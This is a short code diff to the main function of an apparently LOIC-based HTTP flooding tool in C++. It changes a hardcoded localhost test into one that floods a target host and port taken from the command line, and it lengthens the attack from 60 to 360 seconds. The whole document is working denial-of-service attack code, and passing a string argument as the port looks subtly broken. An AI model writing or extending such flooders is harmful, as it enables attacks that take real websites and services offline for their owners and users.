@@ -11,11 +11,18 @@
 
 using namespace loic;
 
-int main() {
-	loic::HTTPFlooder * flood = new loic::HTTPFlooder("127.0.0.1",2345,"gibberish",true,0,2);
+int main(int argc,char *argv [])
+{
+
+	if(argc <3)
+	{
+		std::cout<<argc<<std::endl;
+		exit(0);
+	}
+	loic::HTTPFlooder * flood = new loic::HTTPFlooder(argv[1],argv[2],"?q=gibberish",true,0,2);
 	flood->Start();
 
-	boost::this_thread::sleep(boost::posix_time::seconds(60));
+	boost::this_thread::sleep(boost::posix_time::seconds(360));
 
 	flood->Stop();
 	return 0;
